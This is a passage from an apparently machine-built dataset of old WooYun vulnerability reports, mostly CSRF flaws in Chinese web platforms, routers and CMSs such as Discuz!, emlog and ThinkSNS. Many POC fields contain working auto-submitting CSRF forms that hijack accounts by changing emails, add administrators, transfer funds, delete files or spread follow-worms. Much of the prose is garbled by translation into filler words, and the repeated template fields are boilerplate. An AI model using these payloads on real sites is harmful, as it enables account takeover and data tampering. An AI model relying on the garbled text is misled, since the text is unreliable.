**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="act" value="follow" /><input type="text" name="friendids" value="23117291" /><input type="text" name="uid" value="23117291" />

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2014-063574] nanocloudstoreseriousCSRF vulnerabilitycantargeted attack
**Vendor**: a certain technology company | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thistextcanlook attextcomedirectlytwo timestextpasswordthencantext,textaddoneold password; this is test code,testsuccessshorttextinsidefoundthisseveral,texthasissuetext.

**POC**: thistextcopythenlook attextcomeissuethisistestcode,testsuccesstextseveralvulnerabilitytext

**Bypass**: Direct exploitation

**Fix**: allhttprequestalltextaddvalidation.textsendwebmanagementtextshouldtextthis,textisnottextifthentext
---

---
### [wooyun-2013-021321] Linksys EA2700passwordchangeauthenticationtextandCSRF vulnerability
**Vendor**: Linksys | **Year**: 2013 | **Type**: permissionscontrolBypass

**Meta-thinking**: Trigger signal: functional testing

**Insight**: permissionscontrolBypass lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify permissionscontrolBypass-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Linksys EA2700router,insameonenetworkontextallcanuseremotemanagementtextrouterpassword.thiscantextInternettextquestionthisrouternetwork.CSRFattack!onlytextsendtextPOSTrequesttoapply.cgi,puttextremotemanagementandchangeadministratorpassword.

**POC**: POST /apply.cgi HTTP/1.1Host: [IP redacted]User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveCont

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0117369] hastextCSRFtextpacketone
**Vendor**: hastext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: without further ado,directlyontextkey point.inclickfollowlocationcapture packets.requestdataIthennotagaintextcome.undertextItextoneunderthisvulnerabilityCSRF POCcode.<html><head><title>CSRF POC</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="userId" value="255121945"><input type="hidden" name="typeId" value="1"></form><script>do

**Bypass**: Direct exploitation

**Fix**: requesting a reward.texthastranslated textundertext!
---

---
### [wooyun-2012-08502] a certain social platforma certain social platformone locationCSRF vulnerability
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="type" value="support" /><input type="text" name="gid" value="100346" /><input type="text" name="appkey" value="" /

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2014-063577] Jianguoyun storagewebplatformmanagementhasCSRF vulnerability
**Vendor**: a certain networktechnology company | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: httprequestnotextvalidationinformation,canconstructsubmit

**POC**: runafterlook atresult

**Bypass**: Direct exploitation

**Fix**: httprequestwhenaddtextvalidation
---

---
### [wooyun-2012-013924] a certain social platforma certain social platformone locationCSRFauto-followvulnerability
**Vendor**: a certain social platforma certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inwebsitetextinsidetextcode,whentranslated textquestiontextwebsitetext,nottextfollowtext,then cantextfollowtranslated textaccount.

**POC**: <html><body><form id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="fuid" value="1791277461" /></form><script>document.imlonghao.submit();</script></body></html>

**Bypass**: Direct exploitation

**Fix**: programmers understand.
---

---
### [wooyun-2011-01373] a certain social platforma certain social platformmanagementadmin backendaddressandonesomeinformation leakageandcancanattack
**Vendor**: a certain social platform | **Year**: 2011 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: Parametersinjection, admin backendmanagement

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain social platforma certain social platformmanagementadmin backendwillhasadministratorfortexturlenterlinetranslated text,buttextforprogramforreferercontrolnottext,thisurlthenwillbeonesometextsystemtextto.https://example.com/[redacted]

**POC**: inhost

**Bypass**: Direct exploitation

**Fix**: textnotonlya certain social platformonesystemhasthisissue,textmanagementadmin backendallwillhasthis kind ofrisk,recommendintranslated textaddresstranslated textinsidetextreferer
---

---
### [wooyun-2013-036817] XCar.com.cnone locationtextcsrftext
**Vendor**: XCar.com.cn | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: on timeshas peopletext,translated text,texthearttranslated textInotthrough~https://example.com/[redacted] -

**Bypass**: Direct exploitation

**Fix**: yamete
---

---
### [wooyun-2015-0116229] a certain video sitehijackarbitraryaccount(translated text)
**Vendor**: a certain portal site | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain video sitecrossdomainconfigurationas*so,arbitrarytextflashallcansendtogetherrequestwetranslated text peopleoperationtext,for examplemodifytextname:requestpacket:https://example.com/[redacted]

**POC**: POC:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: *numberconfigurationistextnottext
---

---
### [wooyun-2013-020730] ThinkSNS V3text-01
**Vendor**: ThinkSNS | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: boost followersvulnerability!canCSRF,canhomepageworm.texttest!translated textinofficialV3 user3K+,textboost followers,textlook athere.site:https://example.com/[redacted] /t3/index.php?app=public&mod=Follow&act=doFollow&fid=39XX HTTP/1.1cancelfollow:GET /t3/index.php?app=public&mod=Follow&act=unFollow&fid=39XX HTTP/1.1of course,thisfidthenisneedbetextobjecttext!texttogethercome

**POC**: exploitmethodcaninThinkSNS siteinsidetranslated textthislink,of course,textdirectlythenisputtohomepagetext!translated textlook attohomepagethistranslated textinformation,clickthencantextfollowthisfidof course,aseffecttextgood,textcanputcontenttranslated texthastranslated text!whenotheruserclickthistranslated texteffectfollowsuccess.followfailed,becausethisisIself,selfcannotfollowself.text,thentexttotextfollowerstextnottextistextblog post,textstatus,allcantextthistextsametexttohomepage,sendonetexta certain social platform,texteveryoneallcomefollowtext!texttest,nottext

**Bypass**: Direct exploitation

**Fix**: textcsRF,textaddtokentext.
---

---
### [wooyun-2013-035533] a certain portal siteCSRFtextone:deletespecified userblogarticle
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: constructuseunderform<form action="https://example.com/[redacted]" method="post" ><input type="hidden" name="ids" value="275280127"><input type="submit" value="ok"></form>ids asblogarticle ID ,searchmethod:articleURLdirectlytextexploitmethod:throughtranslated text(email,a certain social platform,text,message)textfortextopentextaddress.

**Bypass**: Direct exploitation

**Fix**: defensefollowandtextCSRFdefensetextgood.
---

---
### [wooyun-2012-05818] a certain search enginewaptextcsrf
**Vendor**: a certain search engine | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: intextsend peopleimage,againputimagetranslated text:https://example.com/[redacted]

**POC**: translated text https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: =.=
---

---
### [wooyun-2015-0145804] ninetextcantranslated textnotwhenhassecuritytextcanberemotecontrol(hasexploitprerequisite)
**Vendor**: joyoung.com | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: ninetranslated textcopytextputtwo peopleport1. 80 porttextput http service,need basic authentication;2. 8899 portas tcp port;fortextenterlineanalysiscancanwilltranslated textsome,throughas followstwotranslated textallcanobtaintotext1. throughtext https://example.com/[redacted] addresstranslated textobtaintext;2. translated text flash in dump text;through strings and ida fortextenterlineanalysis,getas followsinformation:1. text WIFI moduleuseis Hi-Flying  HF-LPB100 solution2. HF-LPB100 text 80 service,textusernamedpasswordtextas admin,ninetextmodifyas:Joyoung-IOT / jyyjy3. 8899 as WIFI module tcp textport,text

**POC**: Itranslated textalreadybetext,beforetranslated textremotecontrolimage,nottextyoulook atvulnerabilitydescriptionshouldthentext.

**Bypass**: Direct exploitation

**Fix**: 1. restriction 80 8899 port,textclose
---

---
### [wooyun-2013-022555] translated textcsrfcanhijackaccount
**Vendor**: translated text | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textmodifyemaillocationnotvalidationtoken,canthroughonetextheartconstructformmodifyaffectedtextemail,texttohijacktext.textforemailneedtextonetext,socanthroughonenumbertextcometranslated text.

**POC**: POC:<html><body><form name="csrf" action="https://example.com/[redacted]" method="POST"><input type=text name=oe value="root@wooyun.org"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root

**Bypass**: Direct exploitation

**Fix**: addtexttokentext20rank,requesting a reward.
---

---
### [wooyun-2015-0109340] a certain translated textcan modifytranslated textaddressmobile phonenumberetc.(csrftwo)
**Vendor**: fruitday.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-022062] a certain social platformCSRFboost followersvulnerability
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain social platformCSRFboost followersvulnerability,directlylink...candirectly imgcan img or iframe ,textexploit,translated texthttps://example.com/[redacted] src="https://example.com/[redacted]" />herethennottextprove..selftext...

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: youtranslated text
---

---
### [wooyun-2015-0101297] ModoerpointtextsystemCSRFadmin backendaddadministrator
**Vendor**: modoer.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: ModoerpointtextsystemCSRFadmin backendaddadministrator

**POC**: truncationcapture packetswefoundnotextvalidation ,constructformthis waythentextadmin backendaddoneadministrator

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2015-092032] translated textCSRFchangedomain namednsserver
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textCSRFchangedomain namednsserverlocationnosettokenetc.textvaluevalidation.causingcsrf.allsiteallnotoken.becauseonlyhasonedomain namecantest sotextonlycantexttodomain namednschangecsrf.textcloudtextetc.textcan.

**POC**: changednscapture packetschecklook atrequestnotexttokenetc.textvaluevalidation.directlyconstructformthen can .

**Bypass**: Direct exploitation

**Fix**: addtokenthen can.
---

---
### [wooyun-2013-036196] communitytextcopycandeletespecifiedreply..
**Vendor**: textcloudofficial | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: texthttps://example.com/[redacted] ID]&x.jpg,managementpersonneltextquestionthistextthen candeletethistextreply.textagaintextnotusetextheartIincommunitytranslated textnottextfortext.

**POC**: textreplytwotextonetextreplyand@xsseronetextreplytextbesuccessdelete.

**Bypass**: Direct exploitation

**Fix**: addtoken..
---

---
### [wooyun-2015-0136903] a certain textnumberadministratoradmin backendclickIsendmessagelink,textnumbertextetc.setthenwillbemodify(Bypasscsrfprotection)
**Vendor**: a certain Internet company | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain Internet companytextnumberadmin backendCSRFprotectionishas,tokenprotectionaddreferrerrestriction,look attogethercometranslated textbut,textfortextonesomenottexthandle,textcanbecsrfattack,useunderisDetails1,textnumberadmin backendtokentextissuetextnumberadmin backendcsrfprotectiontokendirectlyinadmin backendalloperationurlinallwillappear.this waytokenthenhascancanbehttppacketinsiderefererfieldsendtextNo.threetextleakage.Iinusetranslated textarticle https://example.com/[redacted] insidetranslated textthisissuerisk,whentextItranslated textprotectiontext.onetextotherprotectionhasissuewhen,thisissuethenwillbeexploit2,textTOKENsendtextoneselfcantextcontenthttps(textadmin backendishttps,onlytexthttpstextreferrer)urltexta certain Internet companytextaccount,onetextclick,managementadmin backendurlinsidetokenthenwillsendtextwe.directlytranslated textnumbersendtexturl,admin backendisnotwillIdentify .needonetranslated textcometextadmin backendsendlinkputlinktoa certain Internet companytranslated textinthentextquestion

**POC**: textonefriendtextaccounttexttest,textnottranslated textaccountsendlinktextclickaftertextbeImodifytext"hacked by koreans"textfortextbeIattack,sotranslated textItranslated textnumber,textnumberandtextas followsaddtranslated textaccount,translated textstartnotagaintext

**Bypass**: filterBypass

**Fix**: protectiongoodtoken,nottextputingetinpostrequestnottextgetsend
---

---
### [wooyun-2013-019914] [CSRFtext]2-a certain portal sitearbitraryaccounthijack
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain portal sitemodifyemaillocationhascsrf,changetextemail,accountnotthencontroltext?but,emailthistranslated text,needtextonetext.foris,wecanuse jstextnumbertextintranslated textone.text,a certain portal sitemodifyemailrequestintextneedone"oe"Parameters(old email),Itextuseasusenot,canisthisonetextcantranslated text,forisdirectlynotext.

**POC**: POC:<html><body><form name="csrf" action="https://example.com/[redacted]" method="POST"><input type=text name=oe value="root@wooyun.org"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7

**Bypass**: Direct exploitation

**Fix**: inrequest add to translated texttokentext20rank,requesting a reward.
---

---
### [wooyun-2013-038411] Discuz!all versionstextCSRF vulnerabilityone issue
**Vendor**: Discuz! | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: all versionsuniversal!~nottextnottextdzcsrftranslated texthas,thiscsrfisfavoriteforumtextfunctionality.directlygetrequestcsrf,undertextisIlocaltexttest.urlas https://example.com/[redacted]

**POC**: .

**Bypass**: Direct exploitation

**Fix**: 1 gettextpost.2 addtoken.3 validationrefer.
---

---
### [wooyun-2014-081333] textnotexta systemCSRFaddadmin backendadministratoraccount(2translated text)
**Vendor**: textnotext | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface, admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: testsysteminformation(textlatest version):text:https://example.com/[redacted] admin backendaddadministratoraccountrequestas follows.##2 texttesting foundrequestnovalidationreferer,socanconstructtextpoccomeenterlineCSRFattack,POCtestcode is as follows.<form id="csrfdemo" action="http://[IP redacted] method="POST"><input type='hidden' name='Username' value='test111'><input type='hidden' name='Password1' value='123456'><input type='hidden' name='Password2' value='123456'

**POC**: look athost.

**Bypass**: Direct exploitation

**Fix**: 1 validationrequestType.2 validationrefererinformation.
---

---
### [wooyun-2014-080152] PageAdmin CSRF vulnerability#1
**Vendor**: pageadmin.net | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: passwordmodifyfunctionalitynotranslated text:

**POC**: passwordmodifyfunctionalitynotranslated text:

**Bypass**: Direct exploitation

**Fix**: old passwordtexttokenvalidationcoderefervalidationetc....
---

---
### [wooyun-2013-036968] a certain search enginetexta certain functionalityCSRF vulnerabilityoutokenParametersissue
**Vendor**: a certain search engine | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Itranslated textnotgood...=_=,texthasundertexthassomeistext1.thisistextlink:https://example.com/[redacted]

**POC**: 1.noobtainoutokenvalue2.sendtextthatthreetexthastranslated textoutokenvaluelinkimage3.onetexttwotextthreetext4.obtaintooutokenvalue5.thenthentext.....

**Bypass**: Direct exploitation

**Fix**: textobtain(thistextistext)
---

---
### [wooyun-2013-026870] a certain social platformReferertextnottextcanCSRFaddfans
**Vendor**: a certain social platforma certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: andIononevulnerabilityonetext,a certain social platformfora certain sometextusetexthastranslated textlineas.No.threetextusenottextcausingvulnerabilityhas(thistextusetranslated textisa certain social platformofficial).textisReferertextnottext.cancausinghttps://example.com/[redacted] this kind ofdomain namefraud.

**POC**: iftextquestiontextusenotext,usetextloadpagetextcantranslated text.ifusetextusetextdirectlyconstructFrom Postthen can.textaddcannotiframeload,textcanBypass.<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN""https://example.com/[redacted]"><html xmlns="https://example.com/[redacted]"><head><meta http-equiv="Content-Type" content="text/html; charset=u

**Bypass**: Direct exploitation

**Fix**: youtext.
---

---
### [wooyun-2013-035646] a certain sports communitysports sitea certain functionalityhascsrfcantextforumtranslated text
**Vendor**: a certain sports communitysports site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain sports communityhas peoplebankfunctionality, textsingletextastextinsidethis timestriedoneundercapture packetslook attotextnotoken, refertextaftertranslated textsuccess, provehasCSRFcancantext

**POC**: 1. exploitxss.jsincode,inserverontextonehtmlpage<html><script src="xss.js"></script><script>xss.csrf(url="https://example.com/[redacted]", {"action": "virement", "pwuser": "admin", "to_money": "50", "content_plus": "csrf"});</script></html>2. userclickafterthenwilltranslated textadminusertext50textinside3. exploittranslated text,translated textusersendlinktextitsaffected

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-027028] translated textCSRF vulnerabilitycancausingboost followers,textotherinterfacetranslated text
**Vendor**: translated text | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: you know what to do
---

---
### [wooyun-2013-032778] againtranslated textcsrfvulnerability
**Vendor**: translated text | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: directlygettextlocationhandlealltext,5875540asIDnumberaddfollowhttps://example.com/[redacted]

**POC**: followersnotintext,infortextcantext

**Bypass**: Direct exploitation

**Fix**: rewardtexton
---

---
### [wooyun-2015-0101075] emlogcanarbitrarydeletefile
**Vendor**: emlog.net | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface, admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: data.phpif ($action == 'dell_all_bak') {if (!isset($_POST['bak'])) {emDirect('./data.php?error_a=1');} else{foreach ($_POST['bak'] as $val) {unlink($val);}emDirect('./data.php?active_del=1');}}needadmin backendlog in,butnotextsourcetextcanusecsrf

**POC**: <form action=http://localhost/emlog/admin/data.php?action=dell_all_bak method=POST><input type="text" name="bak[]" value="moon.php" /></form><script> document.forms[0].submit(); </script>deletemoon.php

**Bypass**: Direct exploitation

**Fix**: Token
---

---
### [wooyun-2013-021598] a certain social platformOAuth2.0obtainAuthorization Codetranslated text
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: stateParameterscanusefortextcross-siterequest forgery(CSRF)attack,ina certain portal sitetextpagein,Parameterstranslated textthisParameters:https://example.com/[redacted] @HorseLuke textblog:https://example.com/[redacted]

**POC**: a certain social platformobtainAuthorization Coderequestandresponselook attranslated textthencan,textsingletext.undertextisa certain social platforma certain social platformtextstatus,stateallistext,thenistextoneunderthistext.

**Bypass**: Direct exploitation

**Fix**: textcheckcode,textreturnstatethenline.translated textinterfaceParameterstranslated textandcodetextallfornotonnumber.
---

---
### [wooyun-2013-022628] a certain social platforma certain social platformCSRF(GETtype)sendtext,canworm
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: issuepagehttps://example.com/[redacted] putaddressuseimageformsendtoa certain social platformtextforuminside[img]url[/img]onlytranslated textoneopenpostthenaffected.textcanuseemailusetextimageformsendtoemailinside,onetextsendtogetherGETtextquestionthenaffected.translated textlarge!

**POC**: <img src="https://example.com/[redacted]"/>

**Bypass**: Direct exploitation

**Fix**: addrestriction
---

---
### [wooyun-2014-075609] KPPWopen-sourcetextsystemhastextvulnerability(hasexploittext)
**Vendor**: keke.com | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: wetextcometextoneaccounttextsuccessafter,enterunderonepagehttp://localhost/index.php?do=usertextaddressashttp://localhost/index.php?do=seller&id=5529textthiscantext,weuseridas5529thenweagaincomepublishoneproduct.http://localhost/index.php?do=pubgoodshereaddonwetexturlhttp://localhost/admin/index.php?do=user&view=charge&valid=1&maxCash=100&maxCredit=&user=5529&cash_type=1&cash=100&charge_reason=&is_submit=1textgood,thenpublish.submittoadmin backend.this kind oftextwebsiteaddproduct,administratortextwillinadmin backendtext.etc.administratorpointenterafter,herewillgetonerequestthenishostwetranslated text

**POC**: undertextcometextunderwhyusehosturl.admin backendlog invalidationunderidvalidationtextaftersubmit capture packetstextcauseGETthenaddtextsuccess

**Bypass**: Direct exploitation

**Fix**: CSRF
---

---
### [wooyun-2015-0148950] textTVone locationCSRFreplacetext
**Vendor**: a certain textplatform | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: notmodifybeforeurlnotvalidationtoken onlytextlog inuseropen allcanmodifysuccessmodifyafter

**POC**: <iframe src="https://example.com/[redacted]"></iframe>texttoonehtml totranslated text textetc.text sendtemptationtext    puttextalltextXXOO image   textisstreamer   thisunable totext...

**Bypass**: Direct exploitation

**Fix**: Itext
---

---
### [wooyun-2015-0122342] translated textmultiple locationsCSRF(modifytext,text,text)
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: No.one timestextthistranslated text,do not knowwillnotwillnottext

**POC**: POC1(text,Executionafterwillinhttps://example.com/[redacted]  text,needetc.onewill,translated text times):<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="poiId" value="3922" /><input type="hidden" name="type" value="wantUser" /></form><script>document.forms[0].submit

**Bypass**: Direct exploitation

**Fix**: completelynotdefenseCSRF?
---

---
### [wooyun-2010-046] a certain Internet companyMailemailleakagevulnerability
**Vendor**: a certain Internet company | **Year**: 2010 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: as above

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-070403] a certain search enginetextCSRF vulnerabilitycantextwilltextfollow
**Vendor**: a certain search engine | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.texttargettranslated text peoplepost,inpostaftertextaddParameters?fr_bdps_bottom_login=1&autolike=1,thencanfollowthistext2.https://example.com/[redacted])3.(1).as shown,notfollowstatus(2).textquestiontextParameterspost,text,textfollow,thentexttoposttextintext(3)

**POC**: 1.textquestionpost:https://example.com/[redacted] then canfollowItext(1).as shown,notfollowstatus(2).textquestiontextParameterspost,text,textfollow,thentexttoposttextintext(3)

**Bypass**: Direct exploitation

**Fix**: translated text,textto2.5text
---

---
### [wooyun-2012-013813] SOHU CSRFagainonepart,main site.textI,youtranslated textaddtext!
**Vendor**: a certain portal site | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

